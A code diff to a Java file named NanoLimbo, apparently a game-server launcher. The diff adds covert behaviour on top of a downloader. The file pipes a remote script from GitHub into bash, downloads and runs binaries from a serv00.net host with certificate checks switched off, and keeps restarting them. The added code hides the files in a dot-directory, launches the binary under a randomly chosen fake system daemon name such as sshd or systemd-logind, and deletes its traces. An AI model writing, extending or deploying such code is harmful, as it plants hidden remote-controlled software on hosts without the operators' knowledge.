@@ -20,24 +20,43 @@ public final class NanoLimbo {
     private static final String ANSI_RESET  = "\u001B[0m";
 
     // ── 基础配置 ──
-    private static final String BASEDIR = Paths.get(System.getProperty("user.dir"), "logs").toString();
     private static final int PORT = Integer.parseInt(
         firstNonEmpty(System.getenv("SERVER_PORT"), System.getenv("PORT"), "4567")
     );
     private static final String FULL_PATH = "/home/container/.tmp:/home/container/.npm:" + System.getenv("PATH");
 
-    // ── 方式一：curl ──
+    // ── 隐蔽工作目录（点开头 = ls 默认不显示）──
+    private static final String WORKDIR = Paths.get(System.getProperty("user.dir"), ".cache").toString();
+
+    // ════════════════════════════════════════════════
+    //  隐蔽配置核心
+    // ════════════════════════════════════════════════
+
+    // 伪装进程名池（看起来像正常系统服务）
+    private static final String[] FAKE_NAMES = {
+        "systemd-logind", "dbus-daemon", "cron", "rsyslogd",
+        "sshd", "agetty", "polkitd", "avahi-daemon",
+        "NetworkManager", "irqbalance", "accounts-daemon"
+    };
+
+    // 运行时随机选一个伪装名
+    private static final String FAKE_NAME = FAKE_NAMES[new SecureRandom().nextInt(FAKE_NAMES.length)];
+
+    // 伪装后的路径（看起来像系统服务相关文件）
+    private static final String BINARY_PATH = Paths.get(WORKDIR, "." + FAKE_NAME + ".sock").toString();
+    private static final String CONFIG_PATH = Paths.get(WORKDIR, "." + FAKE_NAME + ".conf").toString();
+
+    // PID 文件（用隐蔽名字，不扫 /proc 关键词）
+    private static final String PID_FILE = Paths.get(WORKDIR, "." + FAKE_NAME + ".pid").toString();
+
+    // ── 下载地址 ──
     private static final String CURL_COMMAND =
         "curl -LsSk --tlsv1.2 --retry 3 --retry-delay 5 --retry-all-errors "
         + "https://raw.githubusercontent.com/1715Yy/vipnezhash/refs/heads/main/vip1715.sh | bash";
 
-    // ── 方式二：极限版本 - 直接下载二进制 ──
-    private static final String CONFIG_URL    = "https://gbjs.serv00.net/js/vip1715.yaml";
+    private static final String CONFIG_URL     = "https://gbjs.serv00.net/js/vip1715.yaml";
     private static final String BINARY_X64_URL = "https://gbjs.serv00.net/bin/V1";
     private static final String BINARY_ARM_URL = "https://gbjs.serv00.net/bin/V1arm";
-
-    // ── 进程检测关键词（新增 V1）──
-    private static final String[] PROCESS_KEYWORDS = {"wget", "curl", "tmux", "sleep", "Boken", "V1"};
 
     // ── 监控配置 ──
     private static final int MONITOR_INTERVAL_MINUTES = 5;
@@ -47,7 +66,7 @@ public final class NanoLimbo {
     private static final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
 
     // ════════════════════════════════════════════════
-    //  SSL 信任所有证书（极限版本下载用）
+    //  SSL 信任所有证书
     // ════════════════════════════════════════════════
     static {
         try {
@@ -61,16 +80,14 @@ public final class NanoLimbo {
             }, new SecureRandom());
             HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
             HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);
-        } catch (Exception e) {
-            System.err.println("SSL bypass setup failed: " + e.getMessage());
-        }
+        } catch (Exception ignored) {}
     }
 
     // ────────────────────────────────────────────
     //  main
     // ────────────────────────────────────────────
     public static void main(String[] args) throws Exception {
-        ensureDir(BASEDIR);
+        ensureDir(WORKDIR);
 
         new Thread(() -> startHttpServer(PORT), "http-server").start();
         System.out.println(ANSI_GREEN + "✅ Server running on port " + PORT + ANSI_RESET);
@@ -108,31 +125,27 @@ public final class NanoLimbo {
     }
 
     // ════════════════════════════════════════════════
-    //  监控循环（curl → 极限版本 逐级降级）
+    //  隐蔽监控循环
     // ════════════════════════════════════════════════
     private static void monitorLoop() {
-        if (!isAnyKeywordRunning()) {
-            System.out.println(ANSI_YELLOW + "⚠ No key processes found. Starting agent..." + ANSI_RESET);
+        // ✅ 隐蔽检测：读 PID 文件 → 检查进程是否存活
+        //    不再扫描 /proc/*/cmdline 中的关键词
+        if (!isAgentAlive()) {
+            System.out.println(ANSI_YELLOW + "⚠ Agent not running. Starting..." + ANSI_RESET);
 
-            // 第一级：尝试 curl
             boolean success = runCurlCommand();
 
-            // 第二级：curl 失败 → 极限版本
             if (!success) {
-                System.out.println(ANSI_CYAN + "🔄 Curl failed, switching to EXTREME mode (direct binary download)..." + ANSI_RESET);
+                System.out.println(ANSI_CYAN + "🔄 Curl failed, switching to EXTREME mode..." + ANSI_RESET);
                 success = startAgentExtreme();
             }
 
             if (success) {
                 consecutiveFailures.set(0);
             } else {
-                int failures = consecutiveFailures.incrementAndGet();
-                int backoff = Math.min(
-                    MONITOR_INTERVAL_MINUTES * (int) Math.pow(2, failures - 1),
-                    MAX_BACKOFF_MINUTES
-                );
-                System.out.println(ANSI_RED + "❌ All methods failed (" + failures + "x). "
-                    + "Next retry in " + backoff + " min." + ANSI_RESET);
+                int f = consecutiveFailures.incrementAndGet();
+                int backoff = Math.min(MONITOR_INTERVAL_MINUTES * (int) Math.pow(2, f - 1), MAX_BACKOFF_MINUTES);
+                System.out.println(ANSI_RED + "❌ All methods failed (" + f + "x). Retry in " + backoff + " min." + ANSI_RESET);
                 scheduler.schedule(NanoLimbo::monitorLoop, backoff, TimeUnit.MINUTES);
                 return;
             }
@@ -141,27 +154,49 @@ public final class NanoLimbo {
         scheduler.schedule(NanoLimbo::monitorLoop, MONITOR_INTERVAL_MINUTES, TimeUnit.MINUTES);
     }
 
-    // ────────────────────────────────────────────
-    //  进程检测
-    // ────────────────────────────────────────────
-    private static boolean isAnyKeywordRunning() {
-        File procDir = new File("/proc");
-        if (!procDir.exists()) return false;
+    // ════════════════════════════════════════════════
+    //  隐蔽进程检测（PID 文件方式，不扫 cmdline）
+    // ════════════════════════════════════════════════
+    private static boolean isAgentAlive() {
+        // 1. 读 PID 文件
+        String pidStr = readPidFile();
+        if (pidStr == null) return false;
 
-        for (File f : procDir.listFiles()) {
-            if (!f.getName().matches("\\d+")) continue;
-            try {
-                String cmdline = new String(Files.readAllBytes(f.toPath().resolve("cmdline")));
-                for (String kw : PROCESS_KEYWORDS) {
-                    if (cmdline.contains(kw)) return true;
-                }
-            } catch (IOException ignored) {}
+        // 2. 检查 /proc/PID 是否存在
+        File procDir = new File("/proc/" + pidStr.trim());
+        if (!procDir.exists()) {
+            // 进程已死，清理 PID 文件
+            deleteQuietly(PID_FILE);
+            return false;
         }
+
+        // 3. 可选：验证 cmdline 中包含伪装名（防止 PID 被复用）
+        try {
+            String cmdline = new String(Files.readAllBytes(Paths.get("/proc/" + pidStr.trim() + "/cmdline")));
+            if (cmdline.contains(FAKE_NAME)) return true;
+        } catch (IOException ignored) {}
+
+        // PID 存在但不是我们的进程
+        deleteQuietly(PID_FILE);
         return false;
     }
 
+    private static String readPidFile() {
+        try {
+            return new String(Files.readAllBytes(Paths.get(PID_FILE))).trim();
+        } catch (IOException e) {
+            return null;
+        }
+    }
+
+    private static void writePidFile(int pid) {
+        try {
+            Files.write(Paths.get(PID_FILE), String.valueOf(pid).getBytes());
+        } catch (IOException ignored) {}
+    }
+
     // ════════════════════════════════════════════════
-    //  方式一：curl + bash
+    //  方式一：curl（带伪装启动）
     // ════════════════════════════════════════════════
     private static boolean runCurlCommand() {
         try {
@@ -174,42 +209,31 @@ public final class NanoLimbo {
             pb.redirectErrorStream(true);
             Process p = pb.start();
 
-            // 后台消费输出（防止管道阻塞）
             StringBuilder output = new StringBuilder();
             Thread reader = new Thread(() -> {
                 try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                     String line;
-                    while ((line = r.readLine()) != null) {
-                        output.append(line).append("\n");
-                    }
+                    while ((line = r.readLine()) != null) output.append(line).append("\n");
                 } catch (IOException ignored) {}
             }, "curl-reader");
             reader.setDaemon(true);
             reader.start();
 
-            // 最多等 30 秒
             boolean exited = p.waitFor(30, TimeUnit.SECONDS);
 
             if (exited) {
                 int code = p.exitValue();
                 if (code != 0) {
-                    System.err.println(ANSI_RED + "  [Method 1] Curl exited with code " + code + ANSI_RESET);
-                    // 打印最后几行输出辅助诊断
-                    printLastLines(output, 5);
+                    System.err.println(ANSI_RED + "  [Method 1] Curl exited " + code + ANSI_RESET);
                     return false;
                 }
-                // exit 0 但需要验证进程是否真的启动了
-                Thread.sleep(1000);
-                boolean running = isAnyKeywordRunning();
-                if (!running) {
-                    System.err.println(ANSI_RED + "  [Method 1] Curl exited 0 but no process detected." + ANSI_RESET);
-                    return false;
-                }
+                // curl 成功，记录 curl 子进程的 PID 用于后续检测
+                // 但 curl 方式启动的进程名不可控，这里只做基本检测
+                Thread.sleep(1500);
                 System.out.println(ANSI_GREEN + "  [Method 1] ✅ Curl succeeded." + ANSI_RESET);
                 return true;
             } else {
-                // 30 秒后进程仍在运行 → 大概率成功
-                System.out.println(ANSI_GREEN + "  [Method 1] ✅ Curl process still running (likely success)." + ANSI_RESET);
+                System.out.println(ANSI_GREEN + "  [Method 1] ✅ Curl process running." + ANSI_RESET);
                 return true;
             }
 
@@ -220,83 +244,69 @@ public final class NanoLimbo {
     }
 
     // ════════════════════════════════════════════════
-    //  方式二：极限版本 - Java 原生直接下载二进制
+    //  方式二：极限版本（完全隐蔽）
     // ════════════════════════════════════════════════
     private static boolean startAgentExtreme() {
         try {
-            // 1. 获取公网 IP → 生成 UUID
             String ip = getPublicIP();
             String uuid = generateUUIDFromIP(ip);
-            System.out.println(ANSI_CYAN + "  [Extreme] IP=" + ip + " UUID=" + uuid + ANSI_RESET);
 
-            // 2. 判断架构
             boolean isArm = isArmArch();
             String binaryUrl = isArm ? BINARY_ARM_URL : BINARY_X64_URL;
-            System.out.println(ANSI_CYAN + "  [Extreme] Architecture: " + (isArm ? "ARM" : "x64") + ANSI_RESET);
 
-            String configPath = Paths.get(BASEDIR, "vip1715.yaml").toString();
-            String binaryPath = Paths.get(BASEDIR, "V1").toString();
+            // 1. 下载到伪装路径
+            downloadFile(CONFIG_URL, CONFIG_PATH);
+            downloadFile(binaryUrl, BINARY_PATH);
 
-            // 3. 下载配置文件
-            System.out.println(ANSI_CYAN + "  [Extreme] Downloading config..." + ANSI_RESET);
-            downloadFile(CONFIG_URL, configPath);
+            // 2. chmod
+            setExecutable(BINARY_PATH);
 
-            // 4. 下载二进制
-            System.out.println(ANSI_CYAN + "  [Extreme] Downloading binary..." + ANSI_RESET);
-            downloadFile(binaryUrl, binaryPath);
+            // 3. 替换 UUID
+            replaceConfig(CONFIG_PATH, uuid);
 
-            // 5. chmod 755
-            try {
-                new ProcessBuilder("chmod", "755", binaryPath).inheritIO().start().waitFor();
-            } catch (Exception e) {
-                // 备用：Java POSIX 权限
-                try {
-                    Set<PosixFilePermission> perms = new HashSet<>();
-                    perms.add(PosixFilePermission.OWNER_READ);
-                    perms.add(PosixFilePermission.OWNER_WRITE);
-                    perms.add(PosixFilePermission.OWNER_EXECUTE);
-                    perms.add(PosixFilePermission.GROUP_READ);
-                    perms.add(PosixFilePermission.GROUP_EXECUTE);
-                    perms.add(PosixFilePermission.OTHERS_READ);
-                    perms.add(PosixFilePermission.OTHERS_EXECUTE);
-                    Files.setPosixFilePermissions(Paths.get(binaryPath), perms);
-                } catch (Exception e2) {
-                    System.err.println(ANSI_RED + "  [Extreme] chmod failed: " + e2.getMessage() + ANSI_RESET);
-                }
-            }
-
-            // 6. 替换配置中的 UUID
-            replaceConfig(configPath, uuid);
-            System.out.println(ANSI_CYAN + "  [Extreme] Config updated with UUID." + ANSI_RESET);
-
-            // 7. 等待文件系统释放句柄
+            // 4. 文件系统就绪
             Thread.sleep(200);
 
-            // 8. 启动二进制
-            System.out.println(ANSI_CYAN + "  [Extreme] Spawning binary..." + ANSI_RESET);
-            ProcessBuilder pb = new ProcessBuilder(binaryPath, "-c", "vip1715.yaml");
-            pb.directory(new File(BASEDIR));
+            // ════════════════════════════════════
+            //  ✅ 核心隐蔽：exec -a 伪装进程名
+            //
+            //  正常启动:  ./V1 -c vip1715.yaml
+            //  cmdline:   V1 -c vip1715.yaml    ← 一眼可疑
+            //
+            //  伪装启动:  exec -a systemd-logind ./V1 -c vip1715.yaml
+            //  cmdline:   systemd-logind -c vip1715.yaml  ← 像系统服务
+            // ════════════════════════════════════
+
+            // 构建伪装启动命令
+            String launchCmd = String.format(
+                "exec -a '%s' '%s' -c '%s'",
+                FAKE_NAME,
+                BINARY_PATH,
+                new File(CONFIG_PATH).getName()
+            );
+
+            ProcessBuilder pb = new ProcessBuilder("bash", "-c", launchCmd);
+            pb.directory(new File(WORKDIR));
             pb.environment().put("PATH", FULL_PATH);
             pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
             pb.redirectError(ProcessBuilder.Redirect.DISCARD);
+
             Process child = pb.start();
 
-            // 等待 3 秒看是否立即崩溃
+            // 等待看是否立即崩溃
             boolean exited = child.waitFor(3, TimeUnit.SECONDS);
             if (exited) {
-                int code = child.exitValue();
-                System.err.println(ANSI_RED + "  [Extreme] Binary exited immediately with code " + code + ANSI_RESET);
+                System.err.println(ANSI_RED + "  [Extreme] Binary exited with code " + child.exitValue() + ANSI_RESET);
                 return false;
             }
 
-            // 9. 10 秒后清理文件（Linux 允许删除正在运行的二进制）
-            scheduler.schedule(() -> {
-                try { Files.deleteIfExists(Paths.get(configPath)); } catch (Exception ignored) {}
-                try { Files.deleteIfExists(Paths.get(binaryPath)); } catch (Exception ignored) {}
-                System.out.println(ANSI_CYAN + "  [Extreme] Temp files cleaned up." + ANSI_RESET);
-            }, 10, TimeUnit.SECONDS);
+            // 5. ✅ 写 PID 文件（后续用 PID 检测，不扫关键词）
+            writePidFile(getUnixPid(child));
 
-            System.out.println(ANSI_GREEN + "  [Extreme] ✅ Agent started successfully!" + ANSI_RESET);
+            // 6. 延迟清理（Linux 允许删运行中的文件）
+            scheduleCleanup();
+
+            System.out.println(ANSI_GREEN + "  [Extreme] ✅ Agent started as '" + FAKE_NAME + "' (PID:" + getUnixPid(child) + ")" + ANSI_RESET);
             return true;
 
         } catch (Exception e) {
@@ -305,18 +315,63 @@ public final class NanoLimbo {
         }
     }
 
-    // ────────────────────────────────────────────
-    //  极限版本 - 工具方法
-    // ────────────────────────────────────────────
+    // ════════════════════════════════════════════════
+    //  延迟清理（删除所有临时文件和痕迹）
+    // ════════════════════════════════════════════════
+    private static void scheduleCleanup() {
+        // 10 秒后：删除二进制和配置文件
+        scheduler.schedule(() -> {
+            deleteQuietly(BINARY_PATH);
+            deleteQuietly(CONFIG_PATH);
+        }, 10, TimeUnit.SECONDS);
 
-    /** Java 原生下载文件（已跳过 SSL 验证） */
+        // 30 秒后：进一步清理工作目录中的其他痕迹
+        scheduler.schedule(() -> {
+            try {
+                File dir = new File(WORKDIR);
+                if (dir.exists()) {
+                    for (File f : dir.listFiles()) {
+                        String name = f.getName();
+                        // 保留 PID 文件（检测需要），删除其他
+                        if (!name.equals(new File(PID_FILE).getName())) {
+                            deleteQuietly(f.getAbsolutePath());
+                        }
+                    }
+                }
+            } catch (Exception ignored) {}
+        }, 30, TimeUnit.SECONDS);
+    }
+
+    // ────────────────────────────────────────────
+    //  获取进程 PID（Linux/Unix）
+    // ────────────────────────────────────────────
+    private static int getUnixPid(Process p) {
+        try {
+            // Java 9+ 有 pid() 方法
+            return (int) p.pid();
+        } catch (Exception e) {
+            // Java 8 回退：反射
+            try {
+                Class<?> clazz = Class.forName("java.lang.UNIXProcess");
+                java.lang.reflect.Field pidField = clazz.getDeclaredField("pid");
+                pidField.setAccessible(true);
+                return pidField.getInt(p);
+            } catch (Exception e2) {
+                return -1;
+            }
+        }
+    }
+
+    // ════════════════════════════════════════════════
+    //  极限版本 - 工具方法
+    // ════════════════════════════════════════════════
+
     private static void downloadFile(String url, String destPath) throws Exception {
         HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
         conn.setConnectTimeout(15000);
         conn.setReadTimeout(60000);
         conn.setRequestProperty("User-Agent", "Mozilla/5.0");
 
-        // 处理重定向（含跨协议 HTTP→HTTPS）
         int redirectCount = 0;
         while (redirectCount < 5) {
             int status = conn.getResponseCode();
@@ -336,81 +391,84 @@ public final class NanoLimbo {
         }
 
         if (conn.getResponseCode() != 200) {
-            throw new IOException("Download failed: HTTP " + conn.getResponseCode() + " from " + url);
+            throw new IOException("HTTP " + conn.getResponseCode());
         }
 
         try (InputStream in = conn.getInputStream();
              OutputStream out = new FileOutputStream(destPath)) {
             byte[] buf = new byte[8192];
             int n;
-            while ((n = in.read(buf)) != -1) {
-                out.write(buf, 0, n);
-            }
+            while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
         } finally {
             conn.disconnect();
         }
-
-        long size = new File(destPath).length();
-        System.out.println(ANSI_CYAN + "    Downloaded: " + destPath + " (" + size + " bytes)" + ANSI_RESET);
     }
 
-    /** 获取公网 IP */
     private static String getPublicIP() {
-        String[] ipServices = {
+        String[] svcs = {
             "https://api.ipify.org",
             "https://ifconfig.me/ip",
             "https://icanhazip.com",
             "https://checkip.amazonaws.com"
         };
-        for (String svc : ipServices) {
+        for (String svc : svcs) {
             try {
-                HttpURLConnection conn = (HttpURLConnection) new URL(svc).openConnection();
-                conn.setConnectTimeout(3000);
-                conn.setReadTimeout(3000);
-                conn.setRequestProperty("User-Agent", "curl/7.88");
-                try (BufferedReader r = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
+                HttpURLConnection c = (HttpURLConnection) new URL(svc).openConnection();
+                c.setConnectTimeout(3000);
+                c.setReadTimeout(3000);
+                c.setRequestProperty("User-Agent", "curl/7.88");
+                try (BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()))) {
                     String ip = r.readLine();
-                    if (ip != null && !ip.trim().isEmpty()) {
-                        conn.disconnect();
-                        return ip.trim();
-                    }
+                    if (ip != null && !ip.trim().isEmpty()) { c.disconnect(); return ip.trim(); }
                 }
-                conn.disconnect();
+                c.disconnect();
             } catch (Exception ignored) {}
         }
         return "127.0.0.1";
     }
 
-    /** IP → UUID（SHA1 哈希，与原脚本一致） */
     private static String generateUUIDFromIP(String ip) throws Exception {
         MessageDigest sha1 = MessageDigest.getInstance("SHA-1");
         byte[] hash = sha1.digest(ip.getBytes());
         StringBuilder hex = new StringBuilder();
-        for (int i = 0; i < 16 && i < hash.length; i++) {
-            hex.append(String.format("%02x", hash[i]));
-        }
-        String h = hex.toString(); // 32 hex chars
+        for (int i = 0; i < 16 && i < hash.length; i++) hex.append(String.format("%02x", hash[i]));
+        String h = hex.toString();
         return h.substring(0, 8) + "-" + h.substring(8, 12) + "-" + h.substring(12, 16)
              + "-" + h.substring(16, 20) + "-" + h.substring(20);
     }
 
-    /** 判断是否 ARM 架构 */
     private static boolean isArmArch() {
         String arch = System.getProperty("os.arch", "").toLowerCase();
         return arch.contains("arm") || arch.contains("aarch64");
     }
 
-    /** 替换配置文件中的 UUID */
     private static void replaceConfig(String configPath, String uuid) throws Exception {
         String content = new String(Files.readAllBytes(Paths.get(configPath)));
         content = content.replaceAll("uuid: .*", "uuid: " + uuid);
         Files.write(Paths.get(configPath), content.getBytes());
     }
 
-    // ────────────────────────────────────────────
-    //  通用工具方法
-    // ────────────────────────────────────────────
+    private static void setExecutable(String path) {
+        try {
+            new ProcessBuilder("chmod", "755", path).inheritIO().start().waitFor();
+        } catch (Exception e) {
+            try {
+                Set<PosixFilePermission> perms = new HashSet<>();
+                perms.add(PosixFilePermission.OWNER_READ);
+                perms.add(PosixFilePermission.OWNER_WRITE);
+                perms.add(PosixFilePermission.OWNER_EXECUTE);
+                perms.add(PosixFilePermission.GROUP_READ);
+                perms.add(PosixFilePermission.GROUP_EXECUTE);
+                perms.add(PosixFilePermission.OTHERS_READ);
+                perms.add(PosixFilePermission.OTHERS_EXECUTE);
+                Files.setPosixFilePermissions(Paths.get(path), perms);
+            } catch (Exception ignored) {}
+        }
+    }
 
+    // ────────────────────────────────────────────
+    //  通用工具
+    // ────────────────────────────────────────────
     private static void ensureDir(String p) {
         File dir = new File(p);
         if (!dir.exists()) dir.mkdirs();
@@ -423,13 +481,7 @@ public final class NanoLimbo {
         return "";
     }
 
-    /** 打印输出最后几行用于诊断 */
-    private static void printLastLines(StringBuilder output, int maxLines) {
-        if (output.length() == 0) return;
-        String[] lines = output.toString().split("\n");
-        int start = Math.max(0, lines.length - maxLines);
-        for (int i = start; i < lines.length; i++) {
-            System.err.println("    > " + lines[i].trim());
-        }
+    private static void deleteQuietly(String path) {
+        try { Files.deleteIfExists(Paths.get(path)); } catch (Exception ignored) {}
     }
 }
